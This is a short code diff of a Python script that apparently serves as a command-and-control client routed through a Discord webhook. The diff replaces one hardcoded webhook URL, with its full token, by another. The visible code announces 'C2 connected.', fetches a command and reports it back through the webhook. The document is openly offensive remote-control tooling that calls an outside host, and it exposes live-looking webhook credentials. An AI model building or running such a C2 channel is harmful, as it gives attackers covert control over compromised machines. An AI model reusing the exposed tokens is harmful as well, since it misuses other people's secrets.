@@ -6,7 +6,7 @@
 import requests
 import json
 
-webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"
+webhook = "https://discord.com/api/webhooks/1538679964357107742/gp4Fdmc-h0i3Azx90tPm9t-pRlenPKpO1dh-1uOMCxOo6XMLPcTYsSoonKViSM82FxLk"
 
 def send_command(command):
     payload = {"content": f"[C2] Command: {command}"}
@@ -22,3 +22,5 @@ if __name__ == "__main__":
     send_command("C2 connected.")
     cmd = receive_command()
     send_command(f"Command received: {cmd}")
+
+
